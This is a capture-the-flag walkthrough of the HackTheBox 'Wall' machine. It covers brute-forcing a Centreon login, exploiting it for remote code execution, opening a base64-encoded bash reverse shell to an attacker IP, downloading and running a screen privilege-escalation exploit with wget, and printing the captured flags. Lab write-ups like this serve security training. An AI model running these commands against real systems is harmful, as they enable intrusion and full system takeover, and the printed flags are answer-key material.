# Wall
## Machine
HackTheBox -> Machine -> Wall
## Tools
Tool | Description
------- | -------
[SecLists](https://github.com/danielmiessler/SecLists) | types of lists used during security assessments, collected in one place.
[LinEnum](https://github.com/rebootuser/LinEnum) | 
[Gobuster](https://github.com/OJ/gobuster) | Gobuster is a tool used to brute-force.
[Hydra](https://github.com/vanhauser-thc/thc-hydra) | This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
[nmap](https://github.com/nmap/nmap) | 
[wfuzz](https://github.com/xmendez/wfuzz) | Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.
[searchsploit](https://github.com/offensive-security/exploitdb) |  

## Description
After a **nmap** scan we find that there is a web page.

![Nmap](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_01.png)
```
nmap -sC 10.10.10.157
```
![Web Page](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_02.png)

Now we can use **Gobuster** and **SecList** to discover all the pages hosted.

![Gobuster](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_03.png)
```
gobuster dir -q -t 20 -w /usr/share/seclist/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.157/
```
We find "monitoring" page, and after some test we discover there is a redirect.

![Curl Redirect](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_04.png)

We discover a new page "centreon".

![Centreon Web page](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_05.png)

We try to bruteforce without succes.

![Hydra](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_06.png)
```
hydra -l admin -P /usr/share/seclist/Password/probable-v2-top12000.txt http-post-form://10.10.10.157 -m "/monitoring:useralias=^USER^&password=^PASS^:Your credentials are incorrect"
```
So after we read the source of the page we find there is a token to use.

![Page source](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_07.png)

After some search on internet we find there is an api and we can login with it.
With **Wfuzz** we can bruteforce the login page.

![Wfuzz](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_08.png)
```
wfuzz -c --hc 443 -w /usr/share/seclist/Password/probable-v2-top1575.txt -d 'username=admin&password=FUZZ' "http://10.10.10.157/centreon/api/index.php?action=authenticate"
```
![Password](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_09.png)
```
admin:password1
```
After login and some search we can use an exploit with **searchsploit**

![Searchsploit](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_10.png)
```
searchsploit -m 47069.py
python 47069.py 
```
If this not work you need to do by hand.
```
echo -n "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64
echo${IFS}<base64>|base64${IFS}-d|bash;
```
And using the WebApp start the script on the server.

![WebApp](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_11.png)

![WebApp](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_11_1.png)

Now using netcat we will have a shell.

![shell](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_12.png)
```
nc -lnvp 1337
```
Now you need to download from the server the LineEnum and run it.

To do that you use.

On your pc, on the directory of LineEnum:
```
python2.7 -m SimpleHTTPServer <POSRT>
```
On the server:
```
cd /tmp
wget http://<IP>:<PORT>/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
After using Linenum we find that there is a process screen that is obsolete and vulnerable.

![Linenum](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_13.png)

With **searchsploit** we found the exploit for screen, 41154.
```
searchsploit -m 41154
dos2unix 41154.sh
```
On the server:
```
cd /tmp
wget http://<IP>:<PORT>/41154.sh
chmod +x 41154.sh
./41154.sh
```
Than as root you can read shelby and root flag.

![FLAG](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/06_14.png)
```
cat /home/shelby/user.txt
cat /root/root.txt
```
## FLAG
user: **fe6194544f452f62dc905b12f8da8406**

root: **1fdbcf8c33eaa2599afdc52e1b4d5db7**